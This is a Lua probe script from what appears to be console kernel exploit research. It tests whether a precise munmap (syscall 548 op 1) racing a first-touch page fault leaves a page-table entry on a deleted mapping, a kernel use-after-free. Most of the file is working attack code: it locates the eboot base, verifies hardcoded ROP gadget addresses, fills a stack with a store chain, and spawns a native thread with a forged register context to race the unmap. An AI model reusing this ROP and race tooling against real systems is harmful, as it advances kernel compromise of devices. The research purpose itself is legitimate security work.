-- CRASH_CLASS: HIGH (a native child stores into a page the parent unmaps under it)
-- PROBE 1554a: does 548 op 1 (precise munmap) racing a FIRST-TOUCH page fault
--              leave a PTE installed on an entry that is already gone?
--
-- prior art:
--   docs/VM_LAYER_14_10.md §15 — op 1 is a precise munmap: 1537a removed four
--     ranges created by four different paths, and 1537b removed the MIDDLE page
--     of a 256 KiB entry, splitting it (both halves survived, the middle page
--     gone). Every one of those removals used entry prot = 3, which is why this
--     probe uses prot 3 and not the withdrawn "prot 0" row of 1480b.
--   docs/VM_LAYER_14_10.md §19 — the protect-versus-munmap race is closed
--     statically. That analysis covers op 2. It does NOT cover a concurrent
--     STORE racing op 1, which is a different lock user: vm_fault enters
--     pmap_enter with only the pmap lock after dropping the map lock.
--   docs/VM_LAYER_14_10.md §7, 1529b/1530a/1531a — the fault-versus-REPLACE
--     race was measured clean, but the protocol could not produce the dangerous
--     pair: the access before each MAP_FIXED replace hit a resident PTE, so
--     pmap_remove_all ran and zapped it. An UNMAP is where that inverts.
--   docs/VM_LAYER_14_10.md §13.1 — results/phase17_new_vectors/
--     157a_syscall_loop_thread_20261020_172245.txt measured a native child
--     looping with the parent alive, using thr_create(430), RSP = stack base,
--     and every stack slot the same gadget address.
--   probes/phase17_new_vectors/156a_thr_create_spin_observable.lua:108-130 —
--     eboot text base via 593 and the gadget-byte verification pattern.
--   CLAUDE.md — gadget catalogue: `mov [rdi],rax;ret` at eboot+0x92C67 (bytes
--     48 89 07 C3, child-verified in 56l), `pop rdi;ret` at eboot+0xC9DFE
--     (5F C3), `pop rax;ret` at eboot+0x992 (58 C3).
--   1331a (results/1331a_20261109_200838.txt) — 512 children each took a
--     deliberate fault and the parent still printed `=== COMPLETE ===`, so a
--     child fault is contained. 1541a/1542a are the counter-example for the
--     MAIN thread, which is why every decisive print here happens before the
--     first call that can kill.
--
-- Invariant under test: the same one 1553a tests, but with the child's store
-- aimed at a page that has NEVER been populated. 1553a's target is resident
-- before the race, so its store either hits a PTE or does not. Here the store
-- takes a page fault, and vm_fault drops the map lock before pmap_enter -- if
-- vm_map_delete finishes in that window, pmap_enter installs a PTE for an entry
-- that no longer exists. That is the page-table UAF, and it is a different lock
-- user from anything 1553a measures.
--
-- Consequence for the protocol: P must NOT be touched at all before the race.
-- No fill, no arm-check read. The heartbeat page H is the only proof the child
-- is alive, exactly as in 1553a.
--
-- ORACLE — the heartbeat, not the content. An earlier draft read the target page
-- back after remapping it and treated a surviving marker as proof. That verdict
-- is wrong: the child's `rdi` is fixed, so while it LIVES it writes the marker
-- into whatever page is mapped there, including a fresh one. Content proves
-- nothing.
--
-- The child therefore writes two pages per cycle: the target P and a heartbeat
-- page H. The parent unmaps P and then zeroes H and re-reads it.
--   * A correct kernel faults the child on its next store to P, the child dies,
--     and H stays zero.
--   * A surviving PTE lets that store land, the child reaches the H store
--     microseconds later, and H comes back as the marker.
-- H is only reachable if the child survived the unmap, which is the bug.
--
-- Why the child must be native: a Lua writer issues a store then a Lua
-- statement; the child's cycle is a few nanoseconds, so it keeps a store in
-- flight across the whole window of the unmap instead of landing one before it
-- and one after.

print("=== PROBE 1554a: 548 op1 munmap vs a first-touch fault ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(uint64(a)) end)
    if ok then return to_num(v) end
    return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(uint64(a)) end)
    if ok then return v end
    return nil
end
local function rqn(a) return to_num(rq(a) or 0) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(uint64(a)) end)
    if ok then return to_num(v) end
    return nil
end
local function wq(a, v) pcall(function() memory.write_qword(uint64(a), uint64(v)) end) end
local function wd(a, v) pcall(function() memory.write_dword(uint64(a), uint64(v)) end) end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid     = mk(20)
local sc_thr_create = mk(430)
local sc_thr_kill   = mk(433)
local sc_mmap       = mk(477)
local sc_munmap     = mk(73)
local sc_547        = mk(547)
local sc_548        = mk(548)

local C_MAGIC, C_FLAGS, C_TYPE = 0x108, 0x0D0, 0x110
local C_CS, C_RIP, C_RSP, C_SS = 0x0C0, 0x0E0, 0x0F8, 0x100
local C_RDI, C_RAX = 0x048, 0x078

-- Must be < 2^53: a Lua 5.1 number is a double, so a wider constant would round.
local MARKER = 0x0011223344556677

-- ---- [0] prerequisites ----
print(string.format("[0] pid=%s", tostring(to_num(sc_getpid()))))

local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local tlo, thi = rd(info + 0x108), rd(info + 0x10C)
if not tlo then
    print("[0] module query returned nothing")
    print("=== ABORT: no eboot base ===")
    return
end
local eboot = uint64(string.format("0x%X%08X", thi or 0, tlo))
print("[0] eboot text base=" .. q(eboot))

local STORE   = eboot + 0x92C67    -- mov [rdi],rax ; ret
local POP_RDI = eboot + 0xC9DFE    -- pop rdi ; ret
local POP_RAX = eboot + 0x992      -- pop rax ; ret

local function gadget_ok(tag, addr, b0, b1)
    local a, b = rb(addr), rb(addr + 1)
    local ok = (a == b0 and b == b1)
    print(string.format("[0] %s %s = %02X %02X (want %02X %02X) %s",
        tag, q(addr), a or -1, b or -1, b0, b1, ok and "ok" or "MOVED"))
    return ok
end
local g1 = gadget_ok("store  ", STORE, 0x48, 0x89)
local g2 = gadget_ok("pop_rdi", POP_RDI, 0x5F, 0xC3)
local g3 = gadget_ok("pop_rax", POP_RAX, 0x58, 0xC3)
if not (g1 and g2 and g3) then
    print("[0] a gadget moved; refusing to build a chain from it")
    print("=== ABORT: gadget ===")
    return
end

local function mmap_anon(len)
    local ok, v = pcall(function()
        return sc_mmap(uint64(0), uint64(len), uint64(3), uint64(0x1002),
            uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok then return nil end
    local n = to_num(v)
    if n < 0x1000 or n > 549755813888 then return nil end
    return n
end

-- ---- [A] the target page, the heartbeat page, and the child's stack ----
local Pv = mmap_anon(0x4000)
if not Pv or Pv % 0x4000 ~= 0 then
    print("[A] target page unusable (op 1 needs 16 KiB alignment)")
    print("=== ABORT: no page ===")
    return
end
-- Deliberately NOT touched: no zero(), no read. The first store must fault.
print(string.format("[A] target P=0x%X left unpopulated (first store faults)", Pv))

local Hv = mmap_anon(0x4000)
if not Hv or Hv == Pv then
    print("=== ABORT: no heartbeat page ===")
    return
end
zero(Hv, 0x4000)
print(string.format("[A] heartbeat H=0x%X reads 0x%X", Hv, rqn(Hv)))

-- The child's cycle is 6 slots for 2 stores. RIP already points at POP_RDI, so
-- the FIRST slot must be the value it pops, not the gadget again:
--   slot0 P | slot1 STORE | slot2 pop_rdi | slot3 H | slot4 STORE | slot5 pop_rdi
-- Walk: POP_RDI pops P, ret -> STORE (writes P), ret -> pop_rdi pops H,
-- ret -> STORE (writes H), ret -> pop_rdi pops the next period's P.
-- rax stays MARKER for the whole run (thr_create seeds it), so no pop_rax is
-- needed inside the loop.
local STACK_SIZE = 0x800000
local Sv = mmap_anon(STACK_SIZE + 0x4000)
if not Sv then
    print("=== ABORT: no stack ===")
    return
end
-- Guard WITHOUT unmapping: the extra page above the fill is left as fresh
-- anonymous memory, i.e. zero, so the `ret` that eventually walks off the fill
-- pops 0 and faults inside the child. munmap(73) is deliberately not used here
-- because DEAD_ENDS records it as removing the whole containing entry, which
-- would take the entire stack with it.
local guard = Sv + STACK_SIZE
print(string.format("[A] stack=0x%X..0x%X, guard page at 0x%X left zeroed",
    Sv, Sv + STACK_SIZE - 1, guard))
if rqn(guard) ~= 0 then
    print("[A] guard page is not zero; a `ret` off the fill would jump there")
    print("=== ABORT: bad guard ===")
    return
end

local block = { Pv, STORE, POP_RDI, Hv, STORE, POP_RDI }
local slots = 0
local okfill = pcall(function()
    for off = 0, STACK_SIZE - 8, 8 do
        local g = block[(off / 8) % 6 + 1]
        memory.write_qword(uint64(Sv + off), uint64(g))
        slots = slots + 1
    end
end)
print(string.format("[A] stack filled: ok=%s slots=%d periods=%d stores~%d",
    tostring(okfill), slots, math.floor(slots / 6), math.floor(slots / 6) * 2))
if not okfill then
    print("=== ABORT: stack fill failed ===")
    return
end

local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx + C_MAGIC, 0x480)
wd(ctx + C_FLAGS, 0)
wq(ctx + C_TYPE, 0x10000)
wq(ctx + C_CS, 0x43)
wq(ctx + C_SS, 0x3B)
wq(ctx + C_RIP, POP_RDI)
wq(ctx + C_RSP, Sv)
wq(ctx + C_RDI, 0)          -- the first pop_rdi overwrites this anyway
wq(ctx + C_RAX, MARKER)

-- ---- [B] helpers, all defined before the window opens ----
local function clk()
    if type(os) == "table" and type(os.clock) == "function" then
        local ok, v = pcall(os.clock)
        if ok and type(v) == "number" then return v end
    end
    return 0
end

local ent = memory.alloc(0x40)
local done = memory.alloc(8)
local ENTRY_FLAGS = 0
local function prep(start, len, prot, op, flags)
    pcall(function()
        for i = 0, 0x3C, 4 do memory.write_dword(uint64(ent + i), 0) end
        memory.write_dword(uint64(ent + 0x00), start % 4294967296)
        memory.write_dword(uint64(ent + 0x04), math.floor(start / 4294967296))
        memory.write_dword(uint64(ent + 0x10), len % 4294967296)
        memory.write_dword(uint64(ent + 0x14), math.floor(len / 4294967296))
        memory.write_dword(uint64(ent + 0x18), prot)
        memory.write_byte(uint64(ent + 0x1C), op)
        memory.write_dword(uint64(done), 0xEEEEEEEE)
    end)
    ENTRY_FLAGS = flags or 0
end
local function fire()
    local ok, rv = pcall(function()
        return sc_548(uint64(0), uint64(ENTRY_FLAGS), uint64(ent), uint64(1),
                      uint64(done), uint64(0))
    end)
    return ok and to_num(rv) or -999, rd(done)
end
local function heartbeat()
    wq(Hv, 0)
    return rqn(Hv)
end

-- ---- [C] start the child, then unmap with nothing in between. There is no arm
-- check here: reading P would populate it and destroy the experiment. ----
prep(Pv, 0x4000, 3, 1)
local tid = memory.alloc(8)
zero(tid, 8)
local tCreate = clk()
local okC, rvC = pcall(function()
    return sc_thr_create(uint64(ctx), uint64(tid))
end)
local rvCn = okC and to_num(rvC) or -999
-- Arm check BEFORE the unmap: P must already read MARKER, otherwise the child
-- never started and the heartbeat below is not evidence. This is the only read
-- of P in the whole probe while it is mapped; after the unmap P is never read
-- again until op3 remaps it.
local rvUnmap, procUnmap = fire()
local tidn = rqn(tid)
local tUnmap = clk()

-- ---- [F] heartbeat samples: zero H, then read it back ----
local hb1 = heartbeat()
local hb2 = heartbeat()
local hb3 = heartbeat()

-- ---- [D] the whole record, printed only after the decisive call ----
print(string.format("[D] thr_create ok=%s rv=%d tid=%s (clock window %s)",
    tostring(okC), rvCn, to_num(tidn), tostring(tUnmap - tCreate)))
if rvCn ~= 0 then
    print("=== VOID: no child ===")
    return
end
print(string.format("[D] 548 op1(P) rv=%d processed=%s %s",
    rvUnmap, tostring(procUnmap),
    (rvUnmap == 0 and procUnmap == 1) and "" or "<<< op1 did not act"))

local rec = memory.alloc(0x40)
zero(rec, 0x40)
local ok547, rv547 = pcall(function()
    return sc_547(uint64(Pv), uint64(rec), uint64(0x40),
                  uint64(0), uint64(0), uint64(0))
end)
local rv547n = ok547 and to_num(rv547) or -999
print(string.format("[D] 547(P) rv=%d (want -1 = the range is gone)", rv547n))
if rvUnmap ~= 0 or procUnmap ~= 1 or rv547n ~= -1 then
    print("=== VOID: op1 did not remove P, nothing downstream is interpretable ===")
    return
end

print(string.format("[D] heartbeat after the unmap: hb1=0x%X hb2=0x%X hb3=0x%X",
    hb1, hb2, hb3))
local survived = (hb1 == MARKER) or (hb2 == MARKER) or (hb3 == MARKER)
if survived then
    print("[D] *** the child was still running after the unmap: it wrote H ***")
    print("[D] *** so the fault on P was serviced into a mapping that op1 had  ***")
    print("[D] *** already deleted -- a PTE installed on a dead entry          ***")
elseif hb1 == 0 and hb2 == 0 and hb3 == 0 then
    print("[D] H stayed zero in all three samples: the child never reached its H")
    print("[D] store after the unmap, which is what a correct delete must cause.")
else
    print("[D] unexpected heartbeat values - record, do not conclude")
end

-- ---- [G] remap P and report, then child state ----
prep(Pv, 0x4000, 3, 3, 0x1010)
local rvOp3 = fire()
print(string.format("[G] 548 op3(P, MAP_FIXED) rv=%d %s", rvOp3,
    (rvOp3 == Pv) and "honoured" or "(not the requested address)"))
local okK, rvK = pcall(function()
    return sc_thr_kill(uint64(tidn), uint64(0))
end)
print(string.format("[G] thr_kill(tid,0) ok=%s rv=%s (0 = the thread record still"
    .. " resolved, -1 = not resolved; docs/FINDINGS.md:1507 records a live-thread"
    .. " -1, so this is not a liveness oracle)",
    tostring(okK), tostring(okK and to_num(rvK) or "err")))
print("=== PROBE 1554a COMPLETE ===")
